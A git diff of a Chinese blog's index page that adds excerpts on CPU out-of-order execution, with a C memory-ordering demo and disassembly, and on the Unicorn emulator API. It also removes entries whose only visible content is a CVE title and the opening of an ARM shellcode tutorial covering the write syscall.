@@ -114,6 +114,198 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2023/02/14/CPU乱序执行/" >CPU乱序执行</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-02-14  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+
+		
+        
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+
+	
+
+	</div>
+  <a type="button" href="/2023/02/14/CPU乱序执行/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>先看一个例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line"><span class="keyword">atomic_int</span> flag;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG atomic_load(&amp;flag)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG_XOR(val) atomic_fetch_xor(&amp;flag, val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WAIT_FOR(cond) while (!(cond)) ;</span></span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_x_read_y</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  x=<span class="number">1</span>;</span><br><span class="line">  <span class="comment">// __sync_synchronize();</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_y_read_x</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  y=<span class="number">1</span>;</span><br><span class="line">  <span class="comment">// __sync_synchronize();</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">T1</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">1</span>));</span><br><span class="line">    write_x_read_y();</span><br><span class="line">    FLAG_XOR(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">T2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">2</span>));</span><br><span class="line">    write_y_read_x();</span><br><span class="line">    FLAG_XOR(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tsync</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = y = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//__sync_synchronize(); // full barrier</span></span><br><span class="line">    <span class="comment">//usleep(1);            // + delay</span></span><br><span class="line">    <span class="comment">// assert(FLAG == 0);</span></span><br><span class="line">    FLAG_XOR(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// T1 and T2 clear 0/1-bit, respectively</span></span><br><span class="line">    WAIT_FOR(FLAG == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> tid1;</span><br><span class="line">  <span class="keyword">pthread_t</span> tid2;</span><br><span class="line">  <span class="keyword">pthread_t</span> tid3;</span><br><span class="line">  <span class="keyword">int</span> ret;</span><br><span class="line">  <span class="keyword">void</span> *ptr = &amp;ret;</span><br><span class="line">  ret = pthread_create(&amp;tid1, <span class="literal">NULL</span>, T1, ptr);</span><br><span class="line"></span><br><span class="line">  ret = pthread_create(&amp;tid2, <span class="literal">NULL</span>, T2, ptr);</span><br><span class="line"></span><br><span class="line">  ret = pthread_create(&amp;tid3, <span class="literal">NULL</span>, Tsync, ptr);</span><br><span class="line"></span><br><span class="line">  pthread_join(tid1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(tid2, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(tid3, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码创建了三个线程，T1， T2，Tsync。<br>Tsync的作用是协同T1和T2线程的，先将x，y重新初始化为0，再把T1和T2继续执行的条件FLAG复位，等T1和T2都打印完一遍后，输出换行符。<br>T1先将x赋值为1，再打印y的值。<br>T2先将y赋值为1，再打印x的值。<br>理论上打印的结果不可能出现 0 0 的情况。但是试验结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc mem-ordering.c -o test</span><br><span class="line">./test | head -n 1000000 | sort | uniq -c</span><br><span class="line"></span><br><span class="line">987382 0 0 </span><br><span class="line">10216 0 1 </span><br><span class="line">2396 1 0 </span><br><span class="line">   6 1 1 </span><br></pre></td></tr></table></figure>
+
+<p>这证明CPU确实实在乱序执行的。<br>但是如果将<code>__sync_synchronize();</code>这两行注释打开。结果就不一样了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">366378 0 1 </span><br><span class="line">30491 1 0 </span><br><span class="line">603128 1 1 </span><br></pre></td></tr></table></figure>
+
+<p>这次阻止了乱序执行。打开反汇编代码一窥究竟，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0000000100003c90 &lt;_write_x_read_y&gt;:</span><br><span class="line">100003c90: 55                           pushq   %rbp</span><br><span class="line">100003c91: 48 89 e5                     movq    %rsp, %rbp</span><br><span class="line">100003c94: 48 83 ec 10                  subq    $16, %rsp</span><br><span class="line">100003c98: 48 8d 05 65 43 00 00         leaq    17253(%rip), %rax       ## 0x100008004 &lt;_x&gt;</span><br><span class="line">100003c9f: c7 00 01 00 00 00            movl    $1, (%rax)</span><br><span class="line">100003ca5: 0f ae f0                     mfence</span><br><span class="line">100003ca8: 48 8d 05 59 43 00 00         leaq    17241(%rip), %rax       ## 0x100008008 &lt;_y&gt;</span><br><span class="line">100003caf: 8b 30                        movl    (%rax), %esi</span><br><span class="line">100003cb1: 48 8d 3d f4 02 00 00         leaq    756(%rip), %rdi         ## 0x100003fac &lt;_pthread_join+0x100003fac&gt;</span><br><span class="line">100003cb8: b0 00                        movb    $0, %al</span><br><span class="line">100003cba: e8 db 02 00 00               callq   0x100003f9a &lt;_pthread_join+0x100003f9a&gt;</span><br><span class="line">100003cbf: 48 83 c4 10                  addq    $16, %rsp</span><br><span class="line">100003cc3: 5d                           popq    %rbp</span><br><span class="line">100003cc4: c3                           retq</span><br><span class="line">100003cc5: 66 2e 0f 1f 84 00 00 00 00 00        nopw    %cs:(%rax,%rax)</span><br><span class="line">100003ccf: 90                           nop</span><br><span class="line"></span><br><span class="line">0000000100003cd0 &lt;_write_y_read_x&gt;:</span><br><span class="line">100003cd0: 55                           pushq   %rbp</span><br><span class="line">100003cd1: 48 89 e5                     movq    %rsp, %rbp</span><br><span class="line">100003cd4: 48 83 ec 10                  subq    $16, %rsp</span><br><span class="line">100003cd8: 48 8d 05 29 43 00 00         leaq    17193(%rip), %rax       ## 0x100008008 &lt;_y&gt;</span><br><span class="line">100003cdf: c7 00 01 00 00 00            movl    $1, (%rax)</span><br><span class="line">100003ce5: 0f ae f0                     mfence</span><br><span class="line">100003ce8: 48 8d 05 15 43 00 00         leaq    17173(%rip), %rax       ## 0x100008004 &lt;_x&gt;</span><br><span class="line">100003cef: 8b 30                        movl    (%rax), %esi</span><br><span class="line">100003cf1: 48 8d 3d b4 02 00 00         leaq    692(%rip), %rdi         ## 0x100003fac &lt;_pthread_join+0x100003fac&gt;</span><br><span class="line">100003cf8: b0 00                        movb    $0, %al</span><br><span class="line">100003cfa: e8 9b 02 00 00               callq   0x100003f9a &lt;_pthread_join+0x100003f9a&gt;</span><br><span class="line">100003cff: 48 83 c4 10                  addq    $16, %rsp</span><br><span class="line">100003d03: 5d                           popq    %rbp</span><br><span class="line">100003d04: c3                           retq</span><br><span class="line">100003d05: 66 2e 0f 1f 84 00 00 00 00 00        nopw    %cs:(%rax,%rax)</span><br><span class="line">100003d0f: 90                           nop</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>原来 <code>__sync_synchronize()</code> 函数在中间添加了<code>mfence</code>指令起到内存屏障的作用。<br>假设现在写x读y。正常情况下当cpu写x的时候，发现不在缓存里，而下一条读指令的y恰好在缓存里，然后他就想：“反正这俩有没有关系，我就先读y了，先让x加载着缓存，等我读完y了再写x一样，还更快”。但是加了mfence就不一样了，mfence相当于告诉cpu你不准这么干，前边的那条指令的操作数不在缓存里，你就给我等着。必须把前边干完了，再干下一条。</p>
+
+	
+	</div>
+  <a type="button" href="/2023/02/14/CPU乱序执行/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/11/13/unicorn分析/" >unicorn分析</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-11-13  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+
+		
+        
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+            
+            
+		
+
+	
+
+	</div>
+  <a type="button" href="/2021/11/13/unicorn分析/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="unicorn简介"><a href="#unicorn简介" class="headerlink" title="unicorn简介"></a>unicorn简介</h2><p>unicorn是一个轻量级，多平台，多架构的CPU模拟器框架，支持多种CPU架构，支持windows和linux，提供的API接口简洁易用。使用JIT编译技术，性能表现优异。unicorn是基于qemu而开发的，裁剪了qemu的CPU模拟部分。qemu的TCG机制保证了unicorn具有跨平台优点。</p>
+<h2 id="unicorn-API"><a href="#unicorn-API" class="headerlink" title="unicorn API"></a>unicorn API</h2><h3 id="内存映射-反映射"><a href="#内存映射-反映射" class="headerlink" title="内存映射/反映射"></a>内存映射/反映射</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map</span><span class="params">(uc_engine* uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size, <span class="keyword">uint32_t</span> perms)</span></span>;</span><br><span class="line"><span class="function">uc_err <span class="title">uc_mem_unmap</span><span class="params">(uc_engine* uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="内存读写"><a href="#内存读写" class="headerlink" title="内存读写"></a>内存读写</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_read</span><span class="params">(uc_engine* uc, <span class="keyword">uint64_t</span> address, <span class="keyword">void</span>* bytes, <span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="function">uc_err <span class="title">uc_mem_write</span><span class="params">(uc_engine* uc, <span class="keyword">uint64_t</span> address, <span class="keyword">const</span> <span class="keyword">void</span>* bytes, <span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="寄存器读写"><a href="#寄存器读写" class="headerlink" title="寄存器读写"></a>寄存器读写</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_reg_read</span><span class="params">(un_engine* uc, <span class="keyword">int</span> regid, <span class="keyword">void</span>* value)</span></span>;</span><br><span class="line"><span class="function">uc_err <span class="title">uc_reg_write</span><span class="params">(un_engine* uc, <span class="keyword">int</span> regid, <span class="keyword">const</span> <span class="keyword">void</span>* value)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="指令回调"><a href="#指令回调" class="headerlink" title="指令回调"></a>指令回调</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_hook_add</span><span class="params">(uc_engine *uc, uc_hook *hh, <span class="keyword">int</span> type, <span class="keyword">void</span> *callback, <span class="keyword">void</span> *user_data, <span class="keyword">uint64_t</span> begin, <span class="keyword">uint64_t</span> end, ...)</span></span>;</span><br><span class="line"><span class="function">uc_err <span class="title">uc_hook_del</span><span class="params">(uc_engine *uc, uc_hook hh)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="打开启动停止"><a href="#打开启动停止" class="headerlink" title="打开启动停止"></a>打开启动停止</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_open</span><span class="params">(uc_arch arch, uc_mode mode, uc_engine **uc)</span></span>;</span><br><span class="line"><span class="function">uc_err <span class="title">uc_emu_start</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> begin, <span class="keyword">uint64_t</span> until, <span class="keyword">uint64_t</span> timeout, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"><span class="function">uc_err <span class="title">uc_emu_stop</span><span class="params">(uc_engine *uc)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="unicorn使用流程"><a href="#unicorn使用流程" class="headerlink" title="unicorn使用流程"></a>unicorn使用流程</h2><p>初始化unicorn接口 -&gt; 初始化平台信息 -&gt; 映射虚拟机物理内存 -&gt; 设置虚拟机寄存器组 -&gt; 设置相应的指令回调函数（HOOK_CODE每条指令 HOOK_BLOCK每个指令块 HOOK_INTR int n和syscall执行时回调 HOOK_INSN 特定指令执行时回调） -&gt; 开始模拟执行</p>
+
+	
+	</div>
+  <a type="button" href="/2021/11/13/unicorn分析/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/09/30/一个加密木马的分析/" >一个加密木马的分析</a>
 		</h3>
 		</div>
@@ -1597,401 +1789,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/08/17/CVE-2019-6250/" >CVE-2019-6250 libzmq远程代码执行漏洞分析</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-08-17  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-
-		
-        
-            
-            
-		
-
-	
-
-	</div>
-  <a type="button" href="/2021/08/17/CVE-2019-6250/#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		
-	
-	</div>
-  <a type="button" href="/2021/08/17/CVE-2019-6250/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/08/16/ARM Shellcode的编写/" >ARM Shellcode</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-08-16  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-
-		
-        
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-            
-            
-		
-		
-            
-            <p class="post">&lt;h2 id=&#34;系统调用&#34;&gt;&lt;a href=&#34;#系统调用&#34; class=&#34;headerlink&#34; title=&#34;系统调用&#34;&gt;&lt;/a&gt;系统调用&lt;/h2&gt;&lt;p&gt;从write说起：&lt;/p&gt;
-&lt;p&gt;在linux中的原型为：&lt;/p&gt;
-&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; fd, &lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; *buf, &lt;span class=&#34;keyword&#34;&gt;size_t&lt;/span&gt; count)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;在c语言中的使用方法如下：&lt;/p&gt;
-&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello world\n&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;));        &lt;span class=&#34;comment&#34;&gt;// Here sizeof(string) is 13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;把write的系统调用的汇编代码提取出来。如下：&lt;/p&gt;
-&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270b0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r12&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#96&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;; 0x27118&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270b4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r12&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r12&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=&amp;gt; &lt;span class=&#34;number&#34;&gt;0x000270b8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;teq&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r12&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270bc&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;push&lt;/span&gt; &amp;#123;&lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;&amp;#125;  &lt;span class=&#34;comment&#34;&gt;; (str r7, [sp, #-4]!)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270c0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;bne&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x270dc&lt;/span&gt; &amp;lt;write+&lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270c4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270c8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;fd, buf, count 分别保存在r0,r1,r2中，r7 存放着系统调用号，代表着write这个系统调用。&lt;/p&gt;
-&lt;p&gt;fd – 1 for STDOUT&lt;br&gt;buf – pointer to a string&lt;br&gt;count – number of bytes to write -&amp;gt; 13&lt;br&gt;syscall number of write -&amp;gt; 0x4&lt;/p&gt;
-&lt;p&gt;直接使用系统调用的方式：&lt;/p&gt;
